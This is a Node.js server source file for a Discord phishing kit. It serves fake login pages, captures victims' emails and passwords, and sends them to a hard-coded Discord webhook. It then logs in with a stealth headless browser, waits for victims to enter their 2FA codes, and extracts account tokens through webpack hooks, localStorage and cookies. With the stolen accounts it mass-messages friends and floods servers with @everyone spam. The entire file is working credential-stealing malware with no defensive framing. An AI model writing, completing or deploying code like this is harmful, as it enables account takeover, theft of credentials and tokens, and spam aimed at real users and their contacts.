const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const UserAgent = require('user-agents');

puppeteer.use(StealthPlugin());
puppeteer.use(UserPreferencesPlugin({
    userPrefs: {
        webkit: {
            webprefs: {
                default_font_size: 16
            }
        }
    }
}));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
const CUSTOM_MESSAGE = 'custom message';

const activeSessions = new Map();

function isMobile(req) {
    const ua = req.headers['user-agent'] || '';
    return /mobile|android|iphone|ipad|ipod/i.test(ua);
}

function getIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'unknown';
}

app.get('/', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/oauth2/authorize', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

app.post('/api/capture', async (req, res) => {
    const { email, password, ip: clientIP, userAgent, platform } = req.body;
    const ip = clientIP || getIP(req);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    const data = {
        sessionId,
        email,
        password,
        ip,
        userAgent,
        platform,
        timestamp: new Date().toISOString(),
        url: req.headers.referer || 'direct'
    };
    
    await sendWebhook({
        content: `🎣 **NEW VICTIM**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n💻 Platform: \`${platform}\`\n🆔 Session: \`${sessionId}\`\n⏰ Time: <t:${Math.floor(Date.now()/1000)}:F>`
    });
    
    processLogin(email, password, ip, sessionId);
    
    res.json({ status: 'processing', sessionId });
});

async function processLogin(email, password, ip, sessionId) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080'
            ]
        });
        
        const page = await browser.newPage();
        const userAgent = new UserAgent({ deviceCategory: 'desktop' });
        await page.setUserAgent(userAgent.toString());
        await page.setViewport({ width: 1920, height: 1080 });
        
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });
        
        await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
        
        await humanType(page, 'input[name="email"]', email);
        await delay(500, 1500);
        await humanType(page, 'input[name="password"]', password);
        
        await delay(800, 2000);
        
        await page.click('button[type="submit"]');
        
        await delay(3000, 5000);
        
        // Check for CAPTCHA
        const hasCaptcha = await page.evaluate(() => {
            return document.querySelector('iframe[src*="captcha"]') !== null ||
                   document.querySelector('.h-captcha') !== null ||
                   document.querySelector('[class*="captcha"]') !== null ||
                   document.querySelector('iframe[src*="hcaptcha"]') !== null;
        });
        
        if (hasCaptcha) {
            await sendWebhook({ content: `⚠️ **CAPTCHA DETECTED** - Session: \`${sessionId}\`` });
            await solveCaptcha(page, sessionId);
        }
        
        // Check for 2FA - FIXED SELECTORS
        await delay(3000, 5000);
        
        const is2FA = await page.evaluate(() => {
            // Check for MFA input field
            const mfaInput = document.querySelector('input[name="code"]') || 
                           document.querySelector('input[placeholder*="code"]') ||
                           document.querySelector('input[type="text"][maxlength="6"]') ||
                           document.querySelector('[class*="mfa"] input') ||
                           document.querySelector('[class*="twoFactor"] input');
            
            // Check for email verification text
            const bodyText = document.body.innerText || document.body.textContent || '';
            const hasEmailCheck = bodyText.toLowerCase().includes('check your email') ||
                                bodyText.toLowerCase().includes('verify') ||
                                bodyText.toLowerCase().includes('2fa') ||
                                bodyText.toLowerCase().includes('two-factor') ||
                                bodyText.toLowerCase().includes('authentication code') ||
                                bodyText.toLowerCase().includes('6-digit');
            
            // Check for auth app mention
            const hasAuthApp = bodyText.toLowerCase().includes('authenticator') ||
                             bodyText.toLowerCase().includes('auth app');
            
            return mfaInput !== null || hasEmailCheck || hasAuthApp;
        });
        
        if (is2FA) {
            await sendWebhook({ 
                content: `🔐 **2FA REQUIRED** - Session: \`${sessionId}\`\n⏳ Waiting for user to complete 2FA...` 
            });
            
            const maxWait = 300000;
            const startTime = Date.now();
            let loggedIn = false;
            
            while (Date.now() - startTime < maxWait) {
                await delay(5000);
                
                loggedIn = await page.evaluate(() => {
                    return document.querySelector('[class*="container-"]') !== null &&
                           document.location.href.includes('/channels/');
                });
                
                if (loggedIn) {
                    await sendWebhook({ content: `✅ **2FA BYPASSED** - Session: \`${sessionId}\`` });
                    break;
                }
                
                // Check if still on 2FA page
                const still2FA = await page.evaluate(() => {
                    const bodyText = document.body.innerText || '';
                    return bodyText.toLowerCase().includes('code') ||
                           bodyText.toLowerCase().includes('verify') ||
                           document.querySelector('input[name="code"]') !== null;
                });
                
                if (!still2FA && !loggedIn) {
                    // Might be on error page or other page
                    await sendWebhook({ 
                        content: `⚠️ **2FA PAGE CHANGED** - Session: \`${sessionId}\`\nCurrent URL: ${await page.url()}` 
                    });
                }
            }
            
            if (!loggedIn) {
                await sendWebhook({ 
                    content: `⏰ **2FA TIMEOUT** - Session: \`${sessionId}\`\nUser didn't complete 2FA in time` 
                });
                await browser.close();
                return;
            }
        }
        
        // Check if we're logged in
        const currentUrl = await page.url();
        const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
        
        if (!isLoggedIn) {
            // Check for error message
            const errorText = await page.evaluate(() => {
                const errorEl = document.querySelector('[class*="error"]') || 
                              document.querySelector('[style*="color: rgb(250, 71, 71)"]');
                return errorEl ? errorEl.innerText : null;
            });
            
            await sendWebhook({ 
                content: `❌ **LOGIN FAILED** - Session: \`${sessionId}\`\n${errorText ? 'Error: ' + errorText : 'Unknown error'}\nURL: ${currentUrl}` 
            });
            await browser.close();
            return;
        }
        
        // Extract token - multiple methods
        let token = null;
        
        // Method 1: Webpack
        try {
            token = await page.evaluate(() => {
                let foundToken = null;
                
                // Try webpack
                if (window.webpackChunkdiscord_app) {
                    try {
                        const modules = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                                if (m.default && m.default.getToken !== undefined) {
                                    foundToken = m.default.getToken();
                                    break;
                                }
                                if (m.getToken !== undefined) {
                                    foundToken = m.getToken();
                                    break;
                                }
                            }
                        }]);
                        window.webpackChunkdiscord_app.pop();
                    } catch(e) {}
                }
                
                // Try localStorage
                if (!foundToken) {
                    foundToken = localStorage.getItem('token');
                }
                
                // Try sessionStorage
                if (!foundToken) {
                    foundToken = sessionStorage.getItem('token');
                }
                
                return foundToken;
            });
        } catch(e) {
            await sendWebhook({ content: `⚠️ Token extraction error: ${e.message}` });
        }
        
        // Method 2: Cookies
        if (!token) {
            try {
                const cookies = await page.cookies();
                const tokenCookie = cookies.find(c => c.name.includes('token') || c.value.length > 50);
                if (tokenCookie) token = tokenCookie.value;
            } catch(e) {}
        }
        
        // Method 3: Local storage via CDP
        if (!token) {
            try {
                const localStorageData = await page.evaluate(() => {
                    const data = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data[key] = localStorage.getItem(key);
                    }
                    return data;
                });
                
                for (const [key, value] of Object.entries(localStorageData)) {
                    if (key.includes('token') || (value && value.length > 50 && value.includes('.'))) {
                        token = value;
                        break;
                    }
                }
            } catch(e) {}
        }
        
        if (token) {
            await sendWebhook({ 
                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\nUser: \`${email}\`\n\`\`\`${token}\`\`\`` 
            });
            
            // Start mass spam
            await massSpam(token, sessionId);
        } else {
            await sendWebhook({ 
                content: `⚠️ **NO TOKEN FOUND** - Session: \`${sessionId}\`\nLogin appeared successful but no token extracted` 
            });
        }
        
        await browser.close();
        
    } catch (error) {
        await sendWebhook({ 
            content: `❌ **CRITICAL ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\n${error.stack}\`\`\`` 
        });
        if (browser) await browser.close();
    }
}

async function humanType(page, selector, text) {
    await page.focus(selector);
    for (const char of text) {
        await page.keyboard.type(char, { delay: Math.random() * 100 + 50 });
        if (Math.random() > 0.8) await delay(100, 300);
    }
}

async function solveCaptcha(page, sessionId) {
    try {
        const captchaFrame = await page.$('iframe[src*="captcha"], iframe[src*="hcaptcha"]');
        if (captchaFrame) {
            const box = await captchaFrame.boundingBox();
            if (box) {
                await page.mouse.move(
                    box.x + 20 + Math.random() * 10,
                    box.y + 30 + Math.random() * 10,
                    { steps: 25 }
                );
                await delay(500, 1000);
                await page.mouse.click(
                    box.x + 20 + Math.random() * 10,
                    box.y + 30 + Math.random() * 10
                );
            }
        }
        
        await delay(5000, 8000);
        
    } catch (e) {
        await sendWebhook({ content: `⚠️ CAPTCHA error: ${e.message}` });
    }
}

async function massSpam(token, sessionId) {
    try {
        const { Client } = require('discord.js-selfbot-v13');
        const client = new Client({
            checkUpdate: false,
            patchVoice: false,
            autoRedeemNitro: false,
            ws: {
                properties: {
                    $browser: 'Discord Client'
                }
            }
        });
        
        client.on('ready', async () => {
            await sendWebhook({ 
                content: `🤖 **SPAM BOT READY** - Session: \`${sessionId}\`\nUser: \`${client.user.tag}\` (\`${client.user.id}\`)` 
            });
            
            // Mass DM friends
            try {
                const friends = client.relationships.cache.filter(r => r.type === 1);
                await sendWebhook({ content: `📨 **MASS DM STARTING** - ${friends.size} friends targeted` });
                
                for (const [, relationship] of friends) {
                    try {
                        const user = await client.users.fetch(relationship.id);
                        if (user && user.dmChannel) {
                            for (let i = 0; i < 5; i++) {
                                await user.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
                                await delay(1000, 3000);
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {
                await sendWebhook({ content: `❌ DM Error: ${e.message}` });
            }
            
            // Spam guilds
            try {
                for (const guild of client.guilds.cache.values()) {
                    try {
                        const channel = guild.channels.cache.find(c => 
                            c.type === 'GUILD_TEXT' && 
                            c.permissionsFor(guild.members.me).has('SEND_MESSAGES')
                        );
                        
                        if (channel) {
                            for (let i = 0; i < 10; i++) {
                                await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
                                await delay(2000, 5000);
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {
                await sendWebhook({ content: `❌ Guild Error: ${e.message}` });
            }
            
            await sendWebhook({ content: `✅ **SPAM COMPLETE** - Session: \`${sessionId}\`` });
        });
        
        await client.login(token);
        
    } catch (error) {
        await sendWebhook({ content: `❌ **SPAM FAILED** - Session: \`${sessionId}\`\n${error.message}` });
    }
}

async function sendWebhook(data) {
    try {
        await axios.post(WEBHOOK_URL, data);
    } catch (e) {
        console.error('Webhook failed:', e.message);
    }
}

function delay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
